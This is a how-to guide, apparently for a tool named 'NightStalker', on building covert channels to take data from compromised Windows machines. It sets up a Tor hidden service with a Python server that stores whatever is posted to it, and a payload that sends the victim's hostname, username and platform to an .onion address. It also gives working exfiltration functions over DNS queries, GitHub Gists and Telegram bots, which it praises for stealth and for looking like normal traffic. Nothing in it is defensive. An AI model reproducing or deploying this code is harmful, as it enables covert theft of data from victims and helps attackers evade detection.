# Quick Tor Hidden Service Setup for Windows

## Option 1: Easy Setup (Recommended)

### Step 1: Install Tor Browser
1. Download Tor Browser from https://www.torproject.org/
2. Install and run Tor Browser
3. This gives you a working Tor connection

### Step 2: Use Existing Tor Network Services
Instead of setting up your own hidden service, use existing Tor services:

```python
# Use a Tor exit node or existing hidden service
tor_exit_nodes = [
    "https://httpbin.org/",  # Works through Tor
    "https://postman-echo.com/",  # Another test endpoint
]

# Or use a public hidden service
public_hidden_services = [
    "http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/",  # The Hidden Wiki
]
```

## Option 2: Full Hidden Service Setup

### Step 1: Install Tor Service
```powershell
# Using Chocolatey (if installed)
choco install tor

# Or download from https://www.torproject.org/download/tor/
```

### Step 2: Create Tor Configuration
```powershell
# Create Tor directory
mkdir C:\tor-hidden-service

# Create torrc file
@"
HiddenServiceDir C:\tor-hidden-service
HiddenServicePort 80 127.0.0.1:8080
HiddenServicePort 443 127.0.0.1:8443
"@ | Out-File -FilePath "C:\tor\torrc" -Encoding ASCII
```

### Step 3: Start Tor Service
```powershell
# Install Tor as Windows service
tor --service install

# Start the service
tor --service start

# Check if running
netstat -an | findstr :9050
```

### Step 4: Get Your .onion Address
```powershell
# Check the hostname file
type C:\tor-hidden-service\hostname
```

### Step 5: Create Python Server
```python
# Save as covert_server.py
import socket
import threading
import json
import time
from http.server import HTTPServer, BaseHTTPRequestHandler

class CovertHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(content_length)
        
        # Save received data
        with open(f"received_data_{int(time.time())}.json", "w") as f:
            f.write(data.decode())
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    
    def log_message(self, format, *args):
        print(f"[{time.strftime('%H:%M:%S')}] {format % args}")

# Start server
server = HTTPServer(('127.0.0.1', 8080), CovertHandler)
print("🌙 Covert server running on port 8080")
print("🔗 Accessible via Tor hidden service")
server.serve_forever()
```

### Step 6: Update NightStalker Payload
```python
# Update your exfiltration payload
onion_address = "your-onion-address.onion"  # From Step 4

exfil_code = '''
import os, json, socket, platform
import urllib.request

def exfil_via_tor():
    data = {
        'hostname': socket.gethostname(),
        'user': os.getenv('USERNAME'),
        'platform': platform.platform(),
        'timestamp': time.time()
    }
    
    # Your .onion address
    onion_address = "''' + onion_address + '''"
    
    try:
        req = urllib.request.Request(
            f'http://{onion_address}/',
            data=json.dumps(data).encode(),
            headers={'Content-Type': 'application/json'}
        )
        urllib.request.urlopen(req)
        print("Data exfiltrated via Tor successfully")
    except Exception as e:
        print(f"Tor exfiltration failed: {e}")

exfil_via_tor()
'''
```

## Option 3: No-Server Alternatives (Easiest)

### DNS Exfiltration (No Setup Required)
```python
# This works without any server setup
def dns_exfil(data, domain="your-domain.com"):
    encoded = base64.b64encode(json.dumps(data).encode()).decode()
    chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
    
    for chunk in chunks:
        query = f"{chunk}.{domain}"
        socket.gethostbyname(query)  # This sends the data
        time.sleep(1)
```

### GitHub Gist (Looks Normal)
```python
# Create a GitHub personal access token
# Create a private gist
# Update it with your data

import requests

def gist_exfil(data, gist_id, token):
    headers = {'Authorization': f'token {token}'}
    payload = {'files': {'data.txt': {'content': json.dumps(data)}}}
    requests.patch(f'https://api.github.com/gists/{gist_id}', 
                  headers=headers, json=payload)
```

### Telegram Bot (Very Stealth)
```python
# Create a Telegram bot with @BotFather
# Get bot token and chat ID
# Send data via bot

import requests

def telegram_exfil(data, bot_token, chat_id):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {'chat_id': chat_id, 'text': json.dumps(data)}
    requests.post(url, json=payload)
```

## Quick Start: Use Existing Services

The easiest approach is to use existing services that work through Tor:

```python
# Use httpbin.org (works through Tor)
target_url = "https://httpbin.org/post"

# Or use a public hidden service
target_url = "http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/"

# Your payload will work without setting up your own server
```

## Summary

**Easiest Options (No Server):**
1. **DNS Exfiltration**: No setup, very stealthy
2. **GitHub Gist**: Looks normal, requires token
3. **Telegram Bot**: Very stealthy, requires bot setup

**Medium Difficulty:**
4. **Tor Hidden Service**: Most covert, requires Tor setup

**Quick Start:**
- Use DNS exfiltration with your own domain
- Use GitHub Gist for larger data
- Use existing Tor services for testing

The **DNS exfiltration** method is the easiest to start with - you just need a domain name and it looks like normal DNS traffic! 